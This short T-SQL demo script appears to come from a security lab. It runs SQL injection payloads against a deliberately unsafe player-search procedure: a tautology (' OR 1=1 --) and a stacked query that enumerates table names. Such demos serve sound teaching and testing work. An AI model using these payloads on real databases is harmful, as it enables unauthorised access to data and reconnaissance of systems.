/* M — Reproduce SQL injection attempts.
   Prereq: issue-injection\06_sql_injection.sql.
   WARNING: isolated demo MI only.
*/
SET NOCOUNT ON;
GO

EXEC dbo.usp_search_players_unsafe @name = N'player1';
GO

-- Classic tautology pattern.
EXEC dbo.usp_search_players_unsafe @name = N''' OR 1=1 --';
GO

-- Reconnaissance-like pattern.
EXEC dbo.usp_search_players_unsafe @name = N'''; SELECT TOP (10) name FROM sys.tables; --';
GO
